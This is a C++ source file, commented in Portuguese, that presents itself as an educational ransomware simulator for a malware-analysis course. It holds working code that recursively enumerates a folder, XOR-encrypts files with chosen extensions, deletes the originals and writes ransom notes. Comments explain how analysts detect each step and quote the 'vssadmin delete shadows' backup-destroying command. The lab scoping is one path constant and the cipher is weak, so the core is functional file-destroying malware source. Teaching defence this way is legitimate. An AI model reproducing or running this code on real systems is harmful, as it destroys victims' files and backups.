/*
 * ============================================================
 *  RANSOMWARE_SIM.CPP  —  Simulador Educacional de Ransomware
 * ============================================================
 *
 *  CONTEXTO DO ESTUDO:
 *  Este código replica a ARQUITETURA e TÉCNICAS usadas por
 *  ransomwares reais (WannaCry, LockBit, REvil), porém com:
 *   - Escopo restrito a C:\RansomwareTest\  (nunca sistema)
 *   - XOR simples (não AES-256 irreversível)
 *   - Chave fixa visível (facilitando análise e reversão)
 *
 *  TÉCNICAS DEMONSTRADAS:
 *   1. Enumeração recursiva de arquivos (FindFirstFile/FindNextFile)
 *   2. Filtragem por extensão (extensões-alvo)
 *   3. Cifra XOR de bloco + marcador de cabeçalho
 *   4. Nota de resgate (ransom note)
 *   5. Padrões de nomenclatura de arquivo cifrado
 *
 *  COMO ANALISTAS DETECTAM CADA TÉCNICA → comentado no código.
 *
 *  COMPILE:  g++ ransomware_sim.cpp -o ransomware_sim.exe
 *  AMBIENTE: VM isolada, apenas em C:\RansomwareTest\
 * ============================================================
 */

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <cstdint>

// ═══════════════════════════════════════════════════════════
//  SEÇÃO 1 — CONFIGURAÇÃO E CONSTANTES
//
//  ANÁLISE ESTÁTICA: Strings literais como estas são o PRIMEIRO
//  alvo de um analista. Ferramentas como `strings`, Ghidra e
//  IDA as extraem diretamente do binário, revelando alvos,
//  extensão usada e até a chave em amostras amadoras.
// ═══════════════════════════════════════════════════════════

// Escopo do laboratório — NUNCA mude para caminhos de sistema
const std::string PASTA_ALVO = "C:\\RansomwareTest";

// Chave XOR de 8 bytes (ransomwares reais usam AES-256-CBC ou ChaCha20)
// ANÁLISE: Chave hardcoded é trivialmente recuperável via strings ou debugger
const std::vector<BYTE> CHAVE_XOR = { 0x4C, 0x41, 0x42, 0x4F, 0x52, 0x41, 0x54, 0x4F };
//                                      'L'   'A'   'B'   'O'   'R'   'A'   'T'   'O'

// Extensão adicionada aos arquivos cifrados
// ANÁLISE: Extensões únicas (ex: .wannacry, .lockbit) são usadas
//          por EDRs e SIEM para gerar alertas imediatos
const std::string EXTENSAO_CIFRADA = ".ENCLAB";

// Marcador no cabeçalho do arquivo (magic bytes)
// ANÁLISE: YARA rules procuram por estes magic bytes para identificar a família
const std::string MAGIC_HEADER = "ENCLAB_V1";

// Extensões-alvo (ransomwares reais têm listas de 200+ extensões)
const std::vector<std::string> EXTENSOES_ALVO = {
    ".txt", ".cpp", ".sql", ".ini", ".doc", ".pdf", ".jpg", ".png"
};

// Nome da nota de resgate
const std::string NOME_NOTA = "LEIA_ESTE_ARQUIVO.txt";


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 2 — FUNÇÕES AUXILIARES
// ═══════════════════════════════════════════════════════════

// Retorna a extensão de um arquivo em minúsculas
// Ex: "relatorio.TXT" → ".txt"
std::string obterExtensao(const std::string& nome) {
    size_t pos = nome.rfind('.');
    if (pos == std::string::npos) return "";
    std::string ext = nome.substr(pos);
    for (char& c : ext) c = tolower(c);
    return ext;
}

// Verifica se a extensão está na lista de alvos
bool ehExtensaoAlvo(const std::string& nomeArquivo) {
    std::string ext = obterExtensao(nomeArquivo);
    for (const auto& alvo : EXTENSOES_ALVO) {
        if (ext == alvo) return true;
    }
    return false;
}

// Lê todos os bytes de um arquivo para um vetor
std::vector<BYTE> lerArquivo(const std::string& caminho) {
    std::ifstream f(caminho, std::ios::binary);
    if (!f.is_open()) return {};
    return std::vector<BYTE>(
        std::istreambuf_iterator<char>(f),
        std::istreambuf_iterator<char>()
    );
}

// Escreve um vetor de bytes em um arquivo
bool escreverArquivo(const std::string& caminho, const std::vector<BYTE>& dados) {
    std::ofstream f(caminho, std::ios::binary);
    if (!f.is_open()) return false;
    f.write(reinterpret_cast<const char*>(dados.data()), dados.size());
    return f.good();
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 3 — NÚCLEO DE CIFRA XOR
//
//  COMO FUNCIONA:
//  XOR cifra/decifra com a mesma operação:
//    byte_cifrado = byte_original XOR chave[i % tamanho_chave]
//    byte_original = byte_cifrado XOR chave[i % tamanho_chave]
//
//  RANSOMWARES REAIS usam:
//    - AES-256-CBC ou AES-256-GCM  (simétrico, rápido)
//    - RSA-2048/4096 para proteger a chave AES (assimétrico)
//  O par AES+RSA garante que SEM a chave privada do servidor
//  é matematicamente inviável recuperar os arquivos.
//
//  ANÁLISE DINÂMICA: APIs suspeitas a monitorar:
//    CryptEncrypt, CryptAcquireContext, CryptGenKey (CryptoAPI)
//    BCryptEncrypt, BCryptGenerateSymmetricKey (BCrypt API)
// ═══════════════════════════════════════════════════════════
std::vector<BYTE> aplicarXOR(const std::vector<BYTE>& dados) {
    std::vector<BYTE> resultado(dados.size());
    size_t tamanhoChave = CHAVE_XOR.size();

    for (size_t i = 0; i < dados.size(); i++) {
        // Operação XOR: cada byte é combinado com o byte correspondente da chave
        // O módulo (%) faz a chave "girar" — chamado de keystream cíclico
        resultado[i] = dados[i] ^ CHAVE_XOR[i % tamanhoChave];
    }
    return resultado;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 4 — CIFRA DE UM ARQUIVO
//
//  FLUXO:
//  1. Lê bytes originais
//  2. Cifra com XOR
//  3. Prepend: cabeçalho identificador (magic bytes)
//  4. Salva como arquivo.ext.ENCLAB
//  5. DELETA o original
//
//  ANÁLISE DINÂMICA — O que o Process Monitor mostra:
//    CreateFile  → leitura do original
//    CreateFile  → criação do .ENCLAB
//    SetEndOfFile / WriteFile → escrita cifrada
//    DeleteFile  → exclusão do original ← IOC forte!
//
//  ANÁLISE: VSS (Volume Shadow Copy) também é alvo:
//    vssadmin delete shadows /all /quiet  ← comando suspeito
// ═══════════════════════════════════════════════════════════
bool cifrarArquivo(const std::string& caminho) {
    // Passo 1: Lê o conteúdo original
    std::vector<BYTE> dadosOriginais = lerArquivo(caminho);
    if (dadosOriginais.empty()) return false;

    // Passo 2: Aplica XOR
    std::vector<BYTE> dadosCifrados = aplicarXOR(dadosOriginais);

    // Passo 3: Monta o arquivo final com cabeçalho + dados cifrados
    // Estrutura: [MAGIC_HEADER (9 bytes)] + [tamanho original (8 bytes)] + [dados cifrados]
    std::vector<BYTE> arquivoFinal;

    // Cabeçalho magic (identificação da família de malware)
    for (char c : MAGIC_HEADER) {
        arquivoFinal.push_back(static_cast<BYTE>(c));
    }

    // Tamanho original em 8 bytes little-endian (necessário para reconstrução exata)
    uint64_t tamanhoOriginal = dadosOriginais.size();
    for (int i = 0; i < 8; i++) {
        arquivoFinal.push_back(static_cast<BYTE>((tamanhoOriginal >> (i * 8)) & 0xFF));
    }

    // Dados cifrados
    arquivoFinal.insert(arquivoFinal.end(), dadosCifrados.begin(), dadosCifrados.end());

    // Passo 4: Salva arquivo cifrado com nova extensão
    std::string caminhoCifrado = caminho + EXTENSAO_CIFRADA;
    if (!escreverArquivo(caminhoCifrado, arquivoFinal)) return false;

    // Passo 5: Remove o arquivo original
    // ANÁLISE: DeleteFileA é um IOC (Indicator of Compromise) monitorado por EDRs
    // Ransomwares avançados usam também:
    //   - SetFileAttributesA para remover read-only antes de deletar
    //   - MoveFileEx com MOVEFILE_DELAY_UNTIL_REBOOT para evasão
    DeleteFileA(caminho.c_str());

    return true;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 5 — ENUMERAÇÃO RECURSIVA DE ARQUIVOS
//
//  TÉCNICA: FindFirstFileA + FindNextFileA
//  Esta é a API WinAPI mais usada por ransomwares para varrer
//  todo o sistema de arquivos buscando alvos.
//
//  ANÁLISE ESTÁTICA: A presença de FindFirstFile + DeleteFile
//  no binário (via imports da IAT) é um red flag imediato.
//
//  ANÁLISE DINÂMICA: Process Monitor filtra por:
//    Operation = "CreateFile" + Path contains target dirs
//    → revela exatamente quais pastas o malware acessa
// ═══════════════════════════════════════════════════════════
int enumerarECifrar(const std::string& diretorio) {
    int contadorCifrados = 0;

    // WIN32_FIND_DATA é a struct que armazena metadados de cada entrada
    WIN32_FIND_DATAA findData;

    // O padrão "\\*" retorna TODAS as entradas do diretório
    std::string padrao = diretorio + "\\*";

    HANDLE hFind = FindFirstFileA(padrao.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        std::string nomeEntrada = findData.cFileName;

        // Ignora entradas especiais do sistema de arquivos
        if (nomeEntrada == "." || nomeEntrada == "..") continue;
        // Nunca cifra a nota de resgate (ficaria ilegível para a vítima)
        if (nomeEntrada == NOME_NOTA) continue;

        std::string caminhoCompleto = diretorio + "\\" + nomeEntrada;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // É um diretório → recursão (ransomwares varrem toda a árvore)
            // TÉCNICA DE EVASÃO: Alguns ransomwares pulam pastas do sistema:
            //   "Windows", "Program Files", "System32" etc.
            contadorCifrados += enumerarECifrar(caminhoCompleto);
        } else {
            // É um arquivo → verifica extensão e cifra se for alvo
            if (ehExtensaoAlvo(nomeEntrada)) {
                if (cifrarArquivo(caminhoCompleto)) {
                    std::cout << "  [CIFRADO] " << caminhoCompleto << std::endl;
                    contadorCifrados++;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    // SEMPRE feche handles — leak de handle é detectável via Process Hacker
    FindClose(hFind);
    return contadorCifrados;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 6 — NOTA DE RESGATE (RANSOM NOTE)
//
//  CARACTERÍSTICA FORENSE: A nota é um artefato rico.
//  Analistas extraem dela:
//   - Endereço de contato (email, site .onion)
//   - ID único da vítima (identifica o caso)
//   - Wallet de criptomoeda (rastreável on-chain)
//   - Estilo de escrita (atribuição de autoria)
//   - Tom e sofisticação do grupo
// ═══════════════════════════════════════════════════════════
void criarNotaResgate(const std::string& diretorio) {
    std::string caminhNota = diretorio + "\\" + NOME_NOTA;
    std::ofstream nota(caminhNota);

    nota << "========================================\n";
    nota << "   SEUS ARQUIVOS FORAM CIFRADOS\n";
    nota << "========================================\n\n";
    nota << "[!] ESTO E UMA SIMULACAO EDUCACIONAL [!]\n\n";
    nota << "EXPLICACAO TECNICA:\n";
    nota << "  - Algoritmo usado: XOR com chave LABORATO\n";
    nota << "  - Arquivos afetados: extensao .ENCLAB\n";
    nota << "  - Para recuperar: execute decryptor.exe\n\n";
    nota << "EM UM ATAQUE REAL ESTA NOTA CONTERIA:\n";
    nota << "  - ID unico da vitima (ex: VICTIM-A3F9-2025)\n";
    nota << "  - Endereco .onion para negociacao\n";
    nota << "  - Valor do resgate em Monero/Bitcoin\n";
    nota << "  - Prazo (pressao psicologica: 72 horas)\n";
    nota << "  - Ameaca de publicar dados (double extortion)\n\n";
    nota << "COMO ANALISTAS RASTREIAM O ATACANTE:\n";
    nota << "  1. Blockchain analysis (wallet tracing)\n";
    nota << "  2. OSINT em dominios/emails citados\n";
    nota << "  3. Metadados do binario (compile time, PDB paths)\n";
    nota << "  4. Comparacao com amostras anteriores (YARA/ssdeep)\n\n";
    nota << "CHAVE DE LAB: LABORATO (hex: 4C41424F5241544F)\n";
    nota << "========================================\n";
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 7 — PONTO DE ENTRADA (MAIN)
//
//  ANÁLISE: O fluxo do main() é o primeiro alvo no debugger.
//  Analistas colocam breakpoints em:
//    - GetSystemInfo / GetComputerName (reconhecimento)
//    - CryptAcquireContext (início da criptografia)
//    - FindFirstFile (início da enumeração)
//    - InternetOpenA / WSAStartup (comunicação de rede / C2)
// ═══════════════════════════════════════════════════════════
int main() {
    std::cout << "============================================" << std::endl;
    std::cout << " SIMULADOR EDUCACIONAL DE RANSOMWARE" << std::endl;
    std::cout << " Curso: Defesa Cibernetica - Malware Analysis" << std::endl;
    std::cout << "============================================" << std::endl << std::endl;

    // Verificação de segurança: NUNCA opera fora do lab
    // ANÁLISE: Ransomwares reais fazem checagem INVERSA — verificam se estão
    // em uma sandbox (via GetTickCount, CheckRemoteDebuggerPresent, etc.)
    // e ABORTAM se detectarem ambiente de análise.
    if (PASTA_ALVO.find("RansomwareTest") == std::string::npos) {
        std::cerr << "[ERRO] Caminho alvo invalido. Apenas C:\\RansomwareTest permitido." << std::endl;
        return 1;
    }

    std::cout << "[*] Alvo: " << PASTA_ALVO << std::endl;
    std::cout << "[*] Iniciando enumeracao recursiva..." << std::endl << std::endl;

    // FASE 1: Cifrar todos os arquivos-alvo
    int total = enumerarECifrar(PASTA_ALVO);

    std::cout << std::endl;
    std::cout << "[*] Arquivos cifrados: " << total << std::endl;

    // FASE 2: Criar nota de resgate em cada diretório
    // Ransomwares reais criam a nota em CADA pasta visitada
    criarNotaResgate(PASTA_ALVO);
    criarNotaResgate(PASTA_ALVO + "\\documentos");
    criarNotaResgate(PASTA_ALVO + "\\fotos");
    criarNotaResgate(PASTA_ALVO + "\\projetos");
    criarNotaResgate(PASTA_ALVO + "\\backup");

    std::cout << "[*] Nota de resgate criada em todos os diretorios." << std::endl;

    std::cout << std::endl;
    std::cout << "============================================" << std::endl;
    std::cout << " Simulacao concluida!" << std::endl;
    std::cout << " Execute decryptor.exe para recuperar os arquivos." << std::endl;
    std::cout << "============================================" << std::endl;

    std::cout << std::endl;
    system("pause");
    return 0;
}
